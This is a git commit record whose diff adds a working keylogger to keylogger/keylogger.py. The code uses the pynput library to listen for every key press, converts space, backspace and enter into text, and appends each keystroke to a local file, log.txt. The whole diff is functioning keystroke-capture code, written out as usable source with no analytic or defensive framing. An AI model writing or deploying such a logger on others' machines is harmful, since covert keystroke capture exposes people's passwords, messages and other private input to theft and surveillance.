2469224e4c3956c94ea024885345e717b2c8589f
Moe Kurdi <kurdi1128@gmail.com>
2022-11-22 23:38:33 -0500

    on key press function

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -2,3 +2,20 @@ import pynput
 from pynput.keyboard import Key, Listener
 
 
+def on_keyPress(key):
+    key = str(key).replace("'", "")
+
+    if key == 'Key.space':
+        key = ' '
+    if key == 'Key.backspace':
+        key = '\b'
+    if key == 'Key.enter':
+        key = '\n'
+
+    with open("log.txt", 'a') as f:
+        f.write(key)
+
+  
+
+with Listener(on_press=on_keyPress) as listener: 
+    listener.join()
